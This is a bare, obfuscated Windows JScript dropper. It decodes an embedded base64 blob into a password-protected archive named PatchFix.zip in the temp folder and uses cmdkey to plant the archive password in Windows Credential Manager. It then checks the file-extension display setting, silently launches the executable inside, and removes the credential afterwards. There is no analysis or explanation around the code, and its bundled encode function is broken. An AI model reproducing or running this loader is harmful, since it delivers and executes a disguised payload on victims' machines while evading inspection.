
	try {
	

	var DWjaOpfdd = new ActiveXObject("Scripting.FileSystemObject");
	var jJlYVozh = DWjaOpfdd.GetSpecialFolder(2);

    var faDnnr={ XLLWaRKC:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(PWDAoHagpCZ){ faDnnr.XLLWaRKC;var cEOaGprxuj="",INvniz=0;do{var wxSNbCab=PWDAoHagpCZ.charCodeAt(INvniz++),aLcDEeIlgr=PWDAoHagpCZ.charCodeAt(c++),CjreH=a.charCodeAt(c++),s=(e=e||0)>>2&63,A=(3&e)<<4|(t=t||0)>>4&15,o=(15&t)<<2|(h=h||0)>>6&3,B=63&h;t?h||(B=64):o=B=64,cEOaGprxuj+=faDnnr.XLLWaRKC.charAt(s)+faDnnr.XLLWaRKC.charAt(A)+faDnnr.XLLWaRKC.charAt(o)+faDnnr.XLLWaRKC.charAt(B)}while(c<a.length);return cEOaGprxuj}};
    function Magic1(cEOaGprxuj){if(!/^[a-z0-9+/]+={0,2}$/i.test(cEOaGprxuj)||cEOaGprxuj.length%4!=0)throw Error("Not faDnnr string");for(var t,e,n,o,i,a,f="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",h=[],d=0;d<cEOaGprxuj.length;d+=4)t=(a=f.indexOf(cEOaGprxuj.charAt(d))<<18|f.indexOf(cEOaGprxuj.charAt(d+1))<<12|(o=f.indexOf(cEOaGprxuj.charAt(d+2)))<<6|(i=f.indexOf(cEOaGprxuj.charAt(d+3))))>>>16&255,e=a>>>8&255,n=255&a,h[d/4]=String.fromCharCode(t,e,n),64==i&&(h[d/4]=String.fromCharCode(t,e)),64==o&&(h[d/4]=String.fromCharCode(t));return cEOaGprxuj=h.join("")}
    function EtuwBkihwZ(ukVe,JvXXojFcyXM)
    {var faDnnrdecoded=Magic1(ukVe);var ABHCcksPUCL=new ActiveXObject('ADODB.Stream');ABHCcksPUCL.Type=2;ABHCcksPUCL.charSet='iso-8859-1';ABHCcksPUCL.Open();ABHCcksPUCL.WriteText(faDnnrdecoded);var jhVyJKQAV=new ActiveXObject('ADODB.Stream');jhVyJKQAV.Type=1;jhVyJKQAV.Open();ABHCcksPUCL.Position=0;ABHCcksPUCL.CopyTo(jhVyJKQAV);jhVyJKQAV.SaveToFile(JvXXojFcyXM,2);jhVyJKQAV.Close()}

	var msbgKz = 'UEsDBBQACQAIAAAAAAAAAAAAAAAAAAAAAAAIAAAAUGF0Y2hGaXj4GznpY2L/ADLlzn8+hziWBVBLBwgAAAAAEQAAAAAAAABQSwECFAAUAAkACAAAAAAAAAAAABEAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAUGF0Y2hGaXhQSwUGAAAAAAEAAQA2AAAARwAAAAAA'
    
   
	EtuwBkihwZ(msbgKz,jJlYVozh+"\\PatchFix.zip");
	function VOqmByCsfoV()
	{	
		var MpDrgafbhTg = new ActiveXObject("shell.application");     
		var tYnnQbe = new ActiveXObject("WScript.Shell");
		var lXmVvlBuqCM;
		var xgDZVTnEc = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt";
		var afRB = ""+jJlYVozh+"\\PatchFix.zip";
		lXmVvlBuqCM = MpDrgafbhTg.NameSpace(afRB);
		var yGuj;
		yGuj = lXmVvlBuqCM.Items();  
		WScript.Sleep(5000);

		var WcWEX = tYnnQbe.RegRead(xgDZVTnEc);
		if (WcWEX < 1)  {
			zDavytV = yGuj.Item(yGuj.Item(0).Name);
		}else {
			zDavytV = yGuj.Item((yGuj.Item(0).Name)+".exe");
		}
		zDavytV.Verbs().Item(0).DoIt()
	}
	var erlfxWbAAIU = new ActiveXObject("Wscri"+"pt.shell");
	var AYzPcojA = erlfxWbAAIU.ExpandEnvironmentStrings("%TEMP%");

	var gmDnEgrgJ = new ActiveXObject("shell.application");
	gmDnEgrgJ.ShellExecute('cmdkey', '/generic:Microsoft_Windows_Shell_ZipFolder:filename='+AYzPcojA+'\\PatchFix.zip /pass:BIMcRVKbk /user:""','','',0);      
	VOqmByCsfoV();
	WScript.Sleep(5000);		
	gmDnEgrgJ.ShellExecute('cmdkey', '/delete Microsoft_Windows_Shell_ZipFolder:filename='+AYzPcojA+'\\PatchFix.zip','','',0);



}catch(e) {
}